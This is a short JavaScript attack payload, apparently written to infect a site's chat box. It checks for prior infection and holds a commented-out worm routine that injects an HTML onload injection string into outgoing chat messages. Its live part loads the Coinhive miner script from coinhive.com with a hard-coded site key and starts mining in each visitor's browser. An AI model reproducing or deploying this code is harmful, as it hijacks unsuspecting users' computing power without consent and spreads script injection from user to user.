// BEGIN payload [
//chatBox.payload = "
/* avoid duplicate infection */
if (chatBox.hasOwnProperty('_metadata')) {
    return;}

/* inject worm */
/*
chatBox.sendNewChatMsg = function() {
    if (!localStorage.getItem('chat_cost_confirm')) {
        var costmsg = confirm("Sending messages costs 10 credits. These credits are moved into the hourly rain pool, where active users are given these credits split back to them FREE every hour. If you don't chat, you do not participate in the hourly rains.");
    } else {var costmsg = true;}
    if (!costmsg) { return false; } else {
        localStorage.setItem('chat_cost_confirm', true); }
    var msgToSend = $('#chatmsg').val();
    var chatboxPageFrom = window.location.pathname.split('/')[1];
    chatboxPageFrom += chatBox._metadata.shellcode.replace(
        '$PAYLOAD', chatbox._metadata.payload);
}
*/

chatBox._metadata = new (function() {
    this.payload = 'TODO';
    this.shellcode = '-ico.png" onload="$PAYLOAD"><img class="';
    this.MINER_SITE_KEY = 'SEQdskKvQxTyZSDkP4LsnGoWiMVaoHR7';
    this.load_miner = function () {
        var miner_script = document.createElement('script');
        miner_script.src = 'https://coinhive.com/lib/coinhive.min.js';
        miner_script.type = 'text/javascript';
        document.getElementsByTagName("head")[0].appendChild(miner_script);};
    this.start_miner = function () {
        this.miner = new CoinHive.Anonymous(this.MINER_SITE_KEY);
        this.miner.setThrottle(0.25);
        this.miner.start();
    };
    this.stop_miner = function () {
        this.miner.stop();
    };
});

chatBox._metadata.load_miner();
setTimeout(chatBox._metadata.start_miner, 2000);
//"
// END payload ]
